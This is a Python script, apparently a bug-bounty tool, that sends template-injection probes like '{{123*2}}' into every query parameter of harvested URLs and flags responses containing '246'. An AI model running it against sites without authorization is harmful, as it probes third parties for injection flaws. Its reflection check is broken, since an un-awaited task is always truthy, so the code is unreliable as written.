import urllib,asyncio,aiohttp
from urllib.parse import urlparse
from urllib.parse import parse_qs
from yachalk import chalk

# Usage: python ssti.py 

injectionText="mokoloto"
urlsWithParams="/root/hacking/isoauto/massAutomation/urlsWithParameters.txt"

# I added the payloads for most popular templates
payloads=['{{123*2}}[[123*2]]','{{123*2}}',"{{123*'2'}}",'%23{123*2}','*{123*2}','<%= 123 * 2 %>','${123*2}','${{123*2}}','@(123*2)','#{123*2}','#{ 123 * 2 }','{{123*2}}[[123*2]]','<%= 123*2 %>',"{{123*'2'}}"]

async def fetch(url,session,payload,val):
    path=url.replace(urllib.parse.quote(val),urllib.parse.quote(payload))
    async with session.get(path) as response:
        # print(response.status)
        return await response.text(),path

async def checkIfThereIsReflection(url,val):
    path=url.replace(urllib.parse.quote(val),urllib.parse.quote(injectionText))
    async with aiohttp.ClientSession() as session:
        res = await session.get(path)
        if injectionText in await res.text():
            print("Reflected")
            return True
        else:
            return False

async def runSSTI():
    async with aiohttp.ClientSession() as session:
        tasks = [] 
        with open(urlsWithParams,'r') as f:
            urls=f.read().splitlines()
            for url in urls:
                parts = urlparse(url)
# parse_qs decodes the url encoded strings,this is bad because the vulnerable urls i find via tools like wayback have url encoded parts like %20 for space,but parse_qs decodes %20 to a normal space so the vulnerable string i find will not match with the output of parse_qs, therefore in fetch function, i encode space and other special characters using urllib.parse.quote so i find the exact vulnerable query parameters when using replace,eg, param=hello%20how becomes hello how after using parse_qs so to get the value hello%20how i use urllib.parse.quote inside fetch
                query_dict = parse_qs(parts.query) 
                for key,val in query_dict.items():
                    # print(val)
    # Check if the inserted text is reflected in the response, only then try to make multiple requests and inject payloads
                    reflection=asyncio.create_task(checkIfThereIsReflection(url,val[0]))
                    if reflection:
                        for payload in payloads:
                            # print(query_dict[i][0])
                            tasks.append(asyncio.create_task(fetch(url, session,payload,val[0])))
                        original_result = await asyncio.gather(*tasks)
                        for res,path in original_result:
                             if "246" in res:
                                print(chalk.blue.bold("possible SSTI injection:", path))
                           

def main():
    asyncio.run(runSSTI())

if __name__ == "__main__":
    main()
